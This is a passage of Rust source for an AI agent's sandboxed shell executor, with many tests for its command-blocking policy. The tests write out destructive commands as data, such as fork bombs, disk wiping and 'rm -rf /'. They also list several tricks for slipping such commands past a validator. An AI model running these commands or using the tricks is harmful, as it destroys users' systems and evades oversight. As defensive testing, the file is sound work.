    if cmd.contains(CANARY_DISASTER_FUSE_TOKEN) {
        return Err(ShellPolicyError::DeadManFuse);
    }
    analyze_command(cmd, DEFAULT_CWD, DEFAULT_HOME, 0)
}

// ---------------------------------------------------------------------------
// Executor
// ---------------------------------------------------------------------------

/// Per-stream capture ceiling (256KB buffer cap).
const MAX_CAPTURE_BYTES: usize = 256 * 1024;

/// Result of a sandboxed shell execution.
#[derive(Debug)]
pub struct ShellOutput {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    /// True when either stream exceeded the capture cap and was truncated.
    pub truncated: bool,
    /// Wall-clock duration in milliseconds (sub-ms precision).
    pub duration_ms: f64,
}

#[derive(Debug, Error)]
pub enum ShellError {
    #[error("policy: {0}")]
    Policy(#[from] ShellPolicyError),
    #[error("cwd: {0}")]
    Cwd(#[from] super::sandbox::SandboxError),
    #[error("spawn: {0}")]
    Spawn(#[from] std::io::Error),
}

/// Executes a shell command with layered safety:
///
/// 1. `validate` — typed policy refusal; nothing is ever spawned on refusal.
/// 2. `cwd` resolved through the sandbox layers (canonicalized real path).
/// 3. Spawn `bash -c <cmd>` with `process_group(0)` so the child leads its
///    own process group; on timeout the whole group is SIGKILL'd (no
///    orphaned grandchildren) and the result reports exit code 124.
///
/// stdout/stderr are captured with a per-stream byte cap; streams beyond
/// the cap are drained and `truncated` is set.
/// Executes a shell command asynchronously with layered safety:
///
/// 1. `cwd` resolved through the sandbox layers (canonicalized real path) so
///    the policy sees the actual workspace root.
/// 2. `validate_with_context` — policy validation against the real cwd and the
///    real user home (typed refusal; nothing is ever spawned on refusal).
/// 3. Spawn `bash -c <cmd>` with `process_group(0)`.
pub async fn run_async(
    cmd: &str,
    cwd: &Path,
    timeout: Duration,
) -> Result<ShellOutput, ShellError> {
    // Resolve the cwd through the sandbox layers (canonicalized real path)
    // *first*, so the policy below validates against the actual workspace
    // root (not the `DEFAULT_CWD` constant) and operand normalization is
    // anchored to the real tree.
    let cwd = super::sandbox::resolve_workspace_root(cwd)?;
    // The real user home (platform-derived via `resolve_home`); falls back to
    // `DEFAULT_HOME` when the environment does not expose one.
    let home_str = resolve_home().unwrap_or_else(|| DEFAULT_HOME.to_string());
    let home = std::path::Path::new(&home_str);
    // Policy validation against the real cwd + home — typed refusal, nothing
    // is ever spawned on refusal.
    validate_with_context(cmd, &cwd, home)?;
    execute(cmd, &cwd, timeout).await
}

/// Executes a shell command synchronously by driving `run_async` on a current-thread runtime.
pub fn run(cmd: &str, cwd: &Path, timeout: Duration) -> Result<ShellOutput, ShellError> {
    let rt = tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()?;
    rt.block_on(run_async(cmd, cwd, timeout))
}

/// Drains an async stream into a byte-capped buffer, continuing to read
/// (and discarding) past the cap so the child's pipe never deadlocks.
async fn capture_capped<R: tokio::io::AsyncRead + Unpin>(mut r: R, cap: usize) -> (Vec<u8>, bool) {
    let mut out = Vec::new();
    let mut truncated = false;
    let mut buf = [0u8; 8192];
    loop {
        let n = match r.read(&mut buf).await {
            Ok(0) => break,
            Ok(n) => n,
            Err(_) => break,
        };
        if out.len() >= cap {
            // Buffer already at the cap: discard (drain the pipe) and
            // mark the stream truncated.
            truncated = true;
        } else {
            let room = cap - out.len();
            out.extend_from_slice(&buf[..n.min(room)]);
            if n > room {
                truncated = true;
            }
        }
    }
    (out, truncated)
}

#[cfg(target_os = "linux")]
fn is_unsupported_landlock_fs(path: &Path) -> bool {
    use std::ffi::CString;
    let Ok(c_path) = CString::new(path.to_string_lossy().as_bytes()) else {
        return false;
    };
    let mut stat: libc::statfs = unsafe { std::mem::zeroed() };
    if unsafe { libc::statfs(c_path.as_ptr(), &mut stat) } != 0 {
        return false;
    }
    // Landlock PathBeneath rules are not supported on network/virtual filesystems:
    // 0x01021997 = V9FS_MAGIC (9p/drvfs in WSL), 0x53465342 = SMB2/DRVFS,
    // 0xfe534e51 = CIFS_MAGIC_NUMBER, 0x6969 = NFS_SUPER_MAGIC.
    let ft = stat.f_type as u64;
    let fs_name = match ft {
        0x01021997 => "9p/drvfs (WSL)",
        0x53465342 => "SMB2/DRVFS",
        0xfe534e51 => "CIFS/SMB",
        0x6969 => "NFS",
        _ => "",
    };
    if !fs_name.is_empty() {
        tracing::warn!(
            path = %path.display(),
            fs_type = %format!("0x{ft:08X}"),
            fs = fs_name,
            "Landlock PathBeneath rules are unsupported on this filesystem ({fs_name}); degrading to the in-process 5-layer sandbox for the shell child."
        );
        return true;
    }
    false
}

#[cfg(target_os = "linux")]
fn build_landlock_ruleset(cwd: &Path) -> Result<landlock::RulesetCreated, String> {
    if is_unsupported_landlock_fs(cwd) {
        return Err("virtual/network filesystem does not support Landlock".to_string());
    }
    use landlock::{
        ABI, Access, AccessFs, PathBeneath, PathFd, Ruleset, RulesetAttr, RulesetCreatedAttr,
    };
    let abi = ABI::V1;
    let mut ruleset = Ruleset::default()
        .handle_access(AccessFs::from_all(abi))
        .map_err(|e| format!("Landlock handle_access: {e}"))?
        .create()
        .map_err(|e| format!("Landlock create: {e}"))?;

    // Read-Write for workspace root (cwd)
    let ws_fd = PathFd::new(cwd).map_err(|e| format!("PathFd cwd {}: {e}", cwd.display()))?;
    ruleset = ruleset
        .add_rule(PathBeneath::new(ws_fd, AccessFs::from_all(abi)))
        .map_err(|e| format!("Landlock add_rule cwd: {e}"))?;

    // Read-Write for /tmp and /dev (required for /dev/null, /dev/zero, /dev/urandom)
    for rw_dir in ["/tmp", "/dev"] {
        if let Ok(fd) = PathFd::new(rw_dir) {
            ruleset = ruleset
                .add_rule(PathBeneath::new(fd, AccessFs::from_all(abi)))
                .map_err(|e| format!("Landlock add_rule {rw_dir}: {e}"))?;
        }
    }

    // Read-Only for system paths
    let ro = AccessFs::from_read(abi);
    for dir in ["/usr", "/bin", "/lib", "/lib64", "/etc", "/proc"] {
        if let Ok(fd) = PathFd::new(dir) {
            ruleset = ruleset
                .add_rule(PathBeneath::new(fd, ro))
                .map_err(|e| format!("Landlock add_rule {dir}: {e}"))?;
        }
    }

    // Read-Only for user toolchains, state, and config directories. Includes
    // ~/.gitconfig and ~/.config so git and CLI tools (e.g. cargo, ripgrep,
    // editors) can read their user-level configuration without Permission
    // denied (EACCES) failures from Landlock confinement.
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        for sub in [
            ".castor",
            ".cargo",
            ".rustup",
            ".local",
            ".gitconfig",
            ".config",
        ] {
            let p = home.join(sub);
            if let Ok(fd) = PathFd::new(&p) {
                ruleset = ruleset
                    .add_rule(PathBeneath::new(fd, ro))
                    .map_err(|e| format!("Landlock add_rule {}: {e}", p.display()))?;
            }
        }
    }

    Ok(ruleset)
}

async fn execute(cmd: &str, cwd: &Path, timeout: Duration) -> Result<ShellOutput, ShellError> {
    let t0 = Instant::now();
    let bash = crate::platform::bash_path();
    let mut cmd_builder = tokio::process::Command::new(bash);
    cmd_builder
        .arg("-c")
        .arg(cmd)
        .current_dir(cwd)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());

    #[cfg(unix)]
    cmd_builder.process_group(0);

    #[cfg(target_os = "linux")]
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        let cargo_bin = home.join(".cargo/bin");
        let local_bin = home.join(".local/bin");
        let current_path = std::env::var("PATH").unwrap_or_default();
        let mut new_path = String::new();
        if cargo_bin.is_dir() {
            new_path.push_str(&cargo_bin.to_string_lossy());
            new_path.push(':');
        }
        if local_bin.is_dir() {
            new_path.push_str(&local_bin.to_string_lossy());
            new_path.push(':');
        }
        new_path.push_str(&current_path);
        cmd_builder.env("PATH", new_path);
    }

    #[cfg(target_os = "linux")]
    {
        // When executing under Linux or WSL mounts (such as drvfs 9p mounts), compilers
        // writing temporary files to /tmp (ext4) and atomically renaming to target dirs
        // fail with EXDEV (os error 18, Invalid cross-device link). Scoping TMPDIR to
        // the workspace scratchpad ensures all temporary writes and atomic renames
        // remain on the same filesystem and within the workspace Landlock confinement rule.
        let scratch_tmp = cwd.join(".scratch").join("tmp");
        if std::fs::create_dir_all(&scratch_tmp).is_ok() {
            cmd_builder.env("TMPDIR", &scratch_tmp);
        }

        if let Ok(ruleset) = build_landlock_ruleset(cwd) {
            let mut ruleset_opt = Some(ruleset);
            unsafe {
                cmd_builder.pre_exec(move || {
                    // Best-effort confinement: if the kernel or virtualization layer
                    // rejects restrict_self (e.g. WSL2 hypervisor FD limitations returning EBADF/EPERM),
                    // degrade gracefully to in-process SandboxPolicy path validation rather than
                    // crashing child process spawns.
                    if let Some(r) = ruleset_opt.take() {
                        let _ = r.restrict_self();
                    }
                    Ok(())
                });
            }
        }
    }

    let mut child = cmd_builder.spawn()?;
    let pid = child.id().unwrap_or(0);

    let stdout = child.stdout.take().expect("piped stdout");
    let stderr = child.stderr.take().expect("piped stderr");

    let out_buf = Arc::new(std::sync::Mutex::new(Vec::new()));
    let err_buf = Arc::new(std::sync::Mutex::new(Vec::new()));
    let out_trunc = Arc::new(AtomicBool::new(false));
    let err_trunc = Arc::new(AtomicBool::new(false));

    let out_task = {
        let (buf, flag) = (Arc::clone(&out_buf), Arc::clone(&out_trunc));
        tokio::spawn(async move {
            let (b, t) = capture_capped(stdout, MAX_CAPTURE_BYTES).await;
            *buf.lock().unwrap() = b;
            flag.store(t, Ordering::SeqCst);
        })
    };
    let err_task = {
        let (buf, flag) = (Arc::clone(&err_buf), Arc::clone(&err_trunc));
        tokio::spawn(async move {
            let (b, t) = capture_capped(stderr, MAX_CAPTURE_BYTES).await;
            *buf.lock().unwrap() = b;
            flag.store(t, Ordering::SeqCst);
        })
    };

    // Wait for the child with a deadline, polling `try_wait` so the child
    // handle stays owned (needed to kill the process group on timeout).
    let deadline = tokio::time::Instant::now() + timeout;
    let mut status = None;
    loop {
        match child.try_wait() {
            Ok(Some(s)) => {
                status = Some(s);
                break;
            }
            Ok(None) => {
                if tokio::time::Instant::now() >= deadline {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
            Err(e) => {
                return Err(ShellError::Spawn(e));
            }
        }
    }

    let (exit_code, out, err) = match status {
        Some(status) => {
            let _ = tokio::join!(out_task, err_task);
            let out = std::mem::take(&mut *out_buf.lock().unwrap());
            let mut err = String::from_utf8_lossy(&std::mem::take(&mut *err_buf.lock().unwrap()))
                .into_owned();
            if status.code().is_none() {
                err.push_str("\n[Process terminated by signal]");
            }
            (
                if status.success() {
                    0
                } else {
                    status.code().unwrap_or(1)
                },
                out,
                err,
            )
        }
        None => {
            // Timeout: kill the whole process group, then reap the zombie.
            #[cfg(unix)]
            if pid > 0 {
                unsafe {
                    libc::killpg(pid as i32, libc::SIGKILL);
                    let mut st: libc::c_int = 0;
                    libc::waitpid(pid as i32, &mut st, 0);
                }
            }
            #[cfg(windows)]
            if pid > 0 {
                crate::platform::kill_process_tree(pid);
                let _ = child.kill().await;
            }
            #[cfg(not(any(unix, windows)))]
            {
                let _ = child.kill().await;
            }
            let _ = tokio::join!(out_task, err_task);
            let out = std::mem::take(&mut *out_buf.lock().unwrap());
            let mut err = String::from_utf8_lossy(&std::mem::take(&mut *err_buf.lock().unwrap()))
                .into_owned();
            use std::fmt::Write;
            let _ = write!(err, "\n[Command timed out after {}ms]", timeout.as_millis());
            (124, out, err)
        }
    };

    Ok(ShellOutput {
        exit_code,
        stdout: String::from_utf8_lossy(&out).into_owned(),
        stderr: err,
        truncated: out_trunc.load(Ordering::SeqCst) || err_trunc.load(Ordering::SeqCst),
        duration_ms: t0.elapsed().as_secs_f64() * 1000.0,
    })
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fork_bomb_blocked() {
        assert!(matches!(
            validate(":(){ :|:& };:"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn fork_bomb_no_space_blocked() {
        assert!(matches!(
            validate(":(){ :|:& };"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn fork_bomb_space_before_brace_blocked() {
        assert!(matches!(
            validate(":() { :|:& };"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn mkfs_blocked() {
        assert!(matches!(
            validate("mkfs.ext4 /dev/sda1"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn fdisk_blocked() {
        assert!(matches!(
            validate("fdisk /dev/sda"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn format_drive_blocked() {
        assert!(matches!(
            validate("format C:"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn dd_to_device_blocked() {
        assert!(matches!(
            validate("dd if=/dev/zero of=/dev/sda"),
            Err(ShellPolicyError::ProhibitedPattern(_))
        ));
    }

    #[test]
    fn rm_rf_root_blocked() {
        assert!(matches!(
            validate("rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn rm_rf_home_blocked() {
        assert!(matches!(
            validate("rm -rf /home/user"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn sudo_rm_blocked() {
        assert!(matches!(
            validate("sudo rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn bash_c_rm_blocked() {
        assert!(matches!(
            validate("bash -c \"rm -rf /\""),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn unexpanded_ref_blocked() {
        assert!(matches!(
            validate("rm -rf $HOME"),
            Err(ShellPolicyError::UnexpandedReference(_))
        ));
    }

    #[test]
    fn deadman_fuse_canary() {
        assert!(matches!(
            validate(CANARY_DISASTER_FUSE_TOKEN),
            Err(ShellPolicyError::DeadManFuse)
        ));
    }

    #[test]
    fn empty_command_rejected() {
        assert!(matches!(
            validate("   "),
            Err(ShellPolicyError::InvalidCommand)
        ));
    }

    #[test]
    fn benign_commands_pass() {
        assert!(validate("ls -la").is_ok());
        assert!(validate("cargo build").is_ok());
        assert!(validate("rm -rf ./build").is_ok());
        assert!(validate("echo hello").is_ok());
        assert!(validate("cat file.txt").is_ok());
        assert!(validate("git status").is_ok());
    }

    #[test]
    fn homoglyph_fullwidth_w_blocked() {
        // GAP 8: fullwidth `Ｗ` (U+FF37) folds to `W` under NFKC, so the
        // protected-root string comparison still matches `/mnt/c/windows`.
        assert!(matches!(
            validate("rm -rf /mnt/c/\u{FF37}indows"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }
}

// ---------------------------------------------------------------------------
// Bypass-regression tests: each of the five shell-policy bypasses that
// allowed a destructive command to dodge `validate` is strictly blocked.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod bypass_tests {
    use super::*;

    /// Bypass 1: a single `&` (background-job separator) used instead of
    /// `&&` so the destructive command lands in its own segment.
    #[test]
    fn bypass_single_ampersand_separator_blocked() {
        assert!(matches!(
            validate("echo ok & rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("true & rm -rf /home/user"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // A standalone `&` only splits; benign commands on both sides pass.
        assert!(validate("ls & ls").is_ok());
    }

    /// Bypass 2: a destructive command wrapped in a subshell `(...)`.
    #[test]
    fn bypass_subshell_group_blocked() {
        assert!(matches!(
            validate("(rm -rf /)"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("( rm -rf /home/user )"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("cd /tmp && (rm -rf /)"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("if true; then (rm -rf /); fi"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Quoted parentheses are data, not a group — must stay benign.
        assert!(validate("echo \"(rm -rf /)\"").is_ok());
    }

    /// Bypass 3: a destructive command wrapped in a brace group `{...; }`
    /// (whose trailing `;` previously fragmented the group and let the `rm`
    /// ride through as a lone non-destructive-looking token).
    #[test]
    fn bypass_brace_group_blocked() {
        assert!(matches!(
            validate("{ rm -rf /; }"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("true; { rm -rf /home/user; }"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Nested group forms must be caught at every level.
        assert!(matches!(
            validate("{ (rm -rf /); }"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("( { rm -rf /; } )"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Braces glued to a word are literal text in bash — no group is
        // implied, so the command stays benign.
        assert!(validate("echo a{b c}d").is_ok());
    }

    /// Bypass 4: the `env` wrapper — after stripping `KEY=VAL` assignments
    /// (and `env` flags) the wrapped command must be analyzed, never skipped.
    /// The exploitable variant was a *flag* following an assignment, which
    /// stopped the old scanner inside the wrapper.
    #[test]
    fn bypass_env_wrapper_blocked() {
        assert!(matches!(
            validate("env FOO=1 rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("env FOO=1 -i rm -rf /home/user"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("env -i rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // A transparent wrapper inside `env` is unwrapped as well.
        assert!(matches!(
            validate("env sudo rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Benign `env` usage is unaffected.
        assert!(validate("env FOO=1 ls").is_ok());
        assert!(validate("env").is_ok());
    }

    /// Bypass 5: command substitution inside a destructive operand
    /// (`` rm -rf `pwd` ``) — the operand is an unexpanded reference and must
    /// be refused; the substitution is never trusted, expanded, or executed.
    #[test]
    fn bypass_cmd_substitution_operand_blocked() {
        assert!(matches!(
            validate("rm -rf `pwd`"),
            Err(ShellPolicyError::UnexpandedReference(_))
        ));
        assert!(matches!(
            validate("rm -rf $(pwd)"),
            Err(ShellPolicyError::UnexpandedReference(_))
        ));
        assert!(matches!(
            validate("rm -rf `ls`/secret"),
            Err(ShellPolicyError::UnexpandedReference(_))
        ));
        assert!(matches!(
            validate("rm -rf ${HOME}/x"),
            Err(ShellPolicyError::UnexpandedReference(_))
        ));
        assert!(matches!(
            validate("del `whoami`"),
            Err(ShellPolicyError::UnexpandedReference(_))
        ));
    }

    /// Group recursion is bounded by [`MAX_GROUP_DEPTH`]: deeply nested
    /// groups must terminate (no stack overflow), and the bomb is caught at
    /// any nesting depth below the cap.
    #[test]
    fn deeply_nested_groups_terminate() {
        // Three levels deep: the bomb is inside the group budget and must
        // be caught.
        assert!(matches!(
            validate("(((rm -rf /)))"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Eight levels deep — far below the cap — must be caught too.
        let deep_bomb = "(".repeat(8) + "rm -rf /" + &")".repeat(8);
        assert!(matches!(
            validate(&deep_bomb),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // A benign deep-nested command must pass and terminate promptly.
        let deep_ok = "(".repeat(8) + "echo hi" + &")".repeat(8);
        assert!(validate(&deep_ok).is_ok());
        // Past the cap, analysis must still terminate (no overflow, no hang)
        // with a well-defined verdict.
        let very_deep = "(".repeat(2000) + "echo hi" + &")".repeat(2000);
        let r1 = validate(&very_deep).is_ok();
        let r2 = validate(&very_deep).is_err();
        assert!(r1 || r2);
    }
}

// ---------------------------------------------------------------------------
// Pipe-splitting regression tests: `|` must delimit pipeline segments so a
// destructive command on the *downstream* side of a pipe is analyzed on its
// own (the upstream side alone would otherwise look harmless).
// ---------------------------------------------------------------------------

#[cfg(test)]
mod pipe_tests {
    use super::*;

    /// A destructive command on the downstream side of a pipe must be caught
    /// by the protected-root policy, not skipped because the upstream side
    /// (e.g. `find`, `cat`, `curl`) is a benign verb.
    #[test]
    fn pipe_downstream_rm_rf_root_blocked() {
        assert!(matches!(
            validate("find . | xargs rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("cat file | xargs rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // A destructive verb directly after the pipe (no xargs indirection).
        assert!(matches!(
            validate("echo a | rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    /// `curl ... | sh` — the pipe must split so the downstream `sh` is
    /// analyzed as an independent segment (rather than swallowed into the
    /// benign `curl` verb).
    #[test]
    fn pipe_downstream_shell_split() {
        // The downstream `sh` is a *transparent* wrapper only in the
        // sense that it is analyzed as a segment; a bare `sh` with no `-c`
        // payload is benign on its own, so the whole command is benign.
        // What must be true: the `sh` is *separately* analyzed (it reaches
        // `analyze_segment` as its own verb), not merged with `curl`.
        assert!(validate("curl http://x | sh").is_ok());
    }

    /// A downstream destructive command targeting a system directory through
    /// a pipe must be blocked even though the upstream verb is harmless.
    #[test]
    fn pipe_downstream_system_dir_blocked() {
        // The destructive verb is downstream of the pipe and carries the
        // system-dir operand, so it is analyzed as its own segment and caught.
        assert!(matches!(
            validate("echo x | rm -rf /etc/hosts"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("ls | xargs truncate -s 0 /etc/hosts"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    /// Multi-stage pipelines: every downstream segment is analyzed, so a
    /// destructive stage anywhere in the chain is caught.
    #[test]
    fn multi_stage_pipe_blocked() {
        assert!(matches!(
            validate("ls | grep x | xargs rm -rf /"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }
}

// ---------------------------------------------------------------------------
// System-directory protection regression tests: destructive verbs (expanded
// beyond `rm`) targeting critical system directories must be refused, and
// the *real* cwd/home (not the hardcoded constants) must drive the policy.
// ---------------------------------------------------------------------------

#[cfg(test)]
mod system_dir_tests {
    use super::*;

    fn ctx(cwd: &str, home: &str) -> (std::path::PathBuf, std::path::PathBuf) {
        (
            std::path::PathBuf::from(cwd),
            std::path::PathBuf::from(home),
        )
    }

    // --- Expanded destructive verbs targeting system directories ---

    #[test]
    fn truncate_system_dir_blocked() {
        assert!(matches!(
            validate("truncate -s 0 /etc/hosts"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Also under a live context.
        let (cwd, home) = ctx("/workspace", "/home/user");
        assert!(matches!(
            validate_with_context("truncate -s 0 /etc/hosts", &cwd, &home),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn mv_system_dir_blocked() {
        // Moving a system file out of the system dir destroys it there.
        assert!(matches!(
            validate("mv /etc/hosts /tmp/"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        // Moving *into* a system dir is equally a system-dir write.
        assert!(matches!(
            validate("mv /tmp/evil /etc/"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn cp_system_dir_blocked() {
        assert!(matches!(
            validate("cp /tmp/evil /etc/"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
        assert!(matches!(
            validate("cp /etc/hosts /tmp/"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn tee_system_dir_blocked() {
        assert!(matches!(
            validate("echo x | tee /etc/crontab"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn shred_system_dir_blocked() {
        assert!(matches!(
            validate("shred /usr/lib/libc.so"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    #[test]
    fn wipefs_system_dir_blocked() {
        assert!(matches!(
            validate("wipefs /dev/sda"),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    /// Every critical system directory named in the contract is protected.
    #[test]
    fn all_system_dirs_blocked_for_rm() {
        for dir in ["/etc", "/usr", "/var", "/boot", "/bin", "/lib", "/opt"] {
            let cmd = format!("rm -rf {dir}");
            assert!(
                matches!(
                    validate(&cmd),
                    Err(ShellPolicyError::ProtectedRoot(_, _))
                ),
                "expected '{cmd}' to be blocked"
            );
        }
    }

    /// A *benign* path under the workspace (not a system dir) must still be
    /// allowed for destructive verbs, so the system-dir protection does not
    /// over-block legitimate in-tree work.
    #[test]
    fn workspace_subpath_still_allowed() {
        assert!(validate("rm -rf ./build").is_ok());
        assert!(validate("mv ./a ./b").is_ok());
        assert!(validate("truncate -s 0 ./log.txt").is_ok());
        assert!(validate("cp ./src/main.rs ./backup/").is_ok());
    }

    // --- Real cwd/home through the context-aware entry point ---

    /// `validate_with_context` must anchor `~` to the *actual* home passed in
    /// (not `DEFAULT_HOME`) and `./` to the *actual* cwd.
    #[test]
    fn context_anchors_tilde_to_real_home() {
        // A real home whose path is NOT a protected root; `rm -rf ~` must
        // resolve to that home and be refused (it is a user home dir).
        let (cwd, home) = ctx("/workspace", "/home/someone");
        assert!(matches!(
            validate_with_context("rm -rf ~", &cwd, &home),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    /// A `~` that would NOT be protected under `DEFAULT_HOME` but IS a
    /// protected path under a different real home proves the context is used.
    #[test]
    fn context_home_overrides_default() {
        // Under the default home (/home/user) the operand `~/x` is benign
        // (a subpath, not a protected root).
        assert!(validate("rm -rf ~/x").is_ok());
        // Under a context whose home *is* a protected path, the same `~/x`
        // (relative to that home) — still a subpath, so benign; but `~`
        // alone becomes protected.
        let (cwd, home) = ctx("/workspace", "/root");
        assert!(matches!(
            validate_with_context("rm -rf ~", &cwd, &home),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }

    /// The real workspace root is passed through, not the `DEFAULT_CWD`
    /// constant: a `./rel` path is normalized against the actual cwd.
    #[test]
    fn context_uses_real_cwd_for_relative_paths() {
        // Relative destructive operand anchored to a non-protected cwd is
        // benign regardless of which real cwd is supplied.
        let (cwd, home) = ctx("/home/user/project", "/home/user");
        assert!(validate_with_context("rm -rf ./target", &cwd, &home).is_ok());
    }

    /// `run_async` uses the real cwd/home: a benign relative write resolves
    /// inside the real workspace root, and a system-dir destructive command
    /// is refused *before* anything spawns.
    #[test]
    fn run_async_system_dir_refusal_never_spawns() {
        let dir = std::env::temp_dir().join(format!(
            "castor_shell_run_async_{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let res = run("truncate -s 0 /etc/hosts", &dir, std::time::Duration::from_secs(10));
        assert!(matches!(
            res,
            Err(ShellError::Policy(ShellPolicyError::ProtectedRoot(_, _)))
        ));
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// A benign command through `run_async` with a real cwd/home runs fine
    /// (proves the context-aware path does not over-block legitimate work).
    #[test]
    fn run_async_benign_with_real_context_runs() {
        let dir = std::env::temp_dir().join(format!(
            "castor_shell_run_async_ok_{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let out = run("echo hello", &dir, std::time::Duration::from_secs(10)).unwrap();
        assert_eq!(out.exit_code, 0);
        assert_eq!(out.stdout.trim(), "hello");
        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The single-argument `validate` fallback must still be available and
    /// use the hardcoded `DEFAULT_CWD`/`DEFAULT_HOME` (kept for tests).
    #[test]
    fn single_arg_validate_still_available() {
        assert!(validate("rm -rf /").is_err());
        assert!(validate("ls -la").is_ok());
        // The fallback constants remain importable/defined.
        assert!(!DEFAULT_CWD.is_empty());
        assert!(!DEFAULT_HOME.is_empty());
    }

    /// `validate_with_context` with an empty home falls back to
    /// `DEFAULT_HOME` and still behaves.
    #[test]
    fn validate_with_context_empty_home_falls_back() {
        let cwd = Path::new("/workspace");
        let home = Path::new("");
        // `rm -rf ~` under the default home is protected.
        assert!(matches!(
            validate_with_context("rm -rf ~", cwd, home),
            Err(ShellPolicyError::ProtectedRoot(_, _))
        ));
    }
}

// ---------------------------------------------------------------------------
// Executor tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod run_tests {
    use super::*;
    use std::path::PathBuf;

    fn tmp_dir(tag: &str) -> PathBuf {
        let d =
            std::env::temp_dir().join(format!("castor_shell_test_{tag}_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn benign_echo_runs_and_captures() {
        let dir = tmp_dir("echo");
        let out = run("echo hello", &dir, Duration::from_secs(10)).unwrap();
        assert_eq!(out.exit_code, 0);
        assert_eq!(out.stdout.trim(), "hello");
        assert!(out.stderr.is_empty());
        assert!(!out.truncated);
        assert!(out.duration_ms >= 0.0);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn refusal_rm_rf_root_never_spawns() {
        let dir = tmp_dir("refusal");
        // Marker: if the refused command were ever spawned, this file would
        // eventually be destroyed; it must remain untouched.
        let marker = dir.join("marker.txt");
        std::fs::write(&marker, "alive").unwrap();
        let res = run("rm -rf /", &dir, Duration::from_secs(10));
        assert!(matches!(
            res,
            Err(ShellError::Policy(ShellPolicyError::ProtectedRoot(_, _)))
        ));
        assert!(marker.exists(), "refused command must never spawn");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn refusal_canary_never_spawns_marker() {
        let dir = tmp_dir("canary");
        // Stronger proof: the refused command would CREATE the marker file
        // if it were ever spawned. It must not exist afterwards.
        let marker = dir.join("marker.txt");
        let cmd = format!("echo {CANARY_DISASTER_FUSE_TOKEN} > {}", marker.display());
        let res = run(&cmd, &dir, Duration::from_secs(10));
        assert!(matches!(
            res,
            Err(ShellError::Policy(ShellPolicyError::DeadManFuse))
        ));
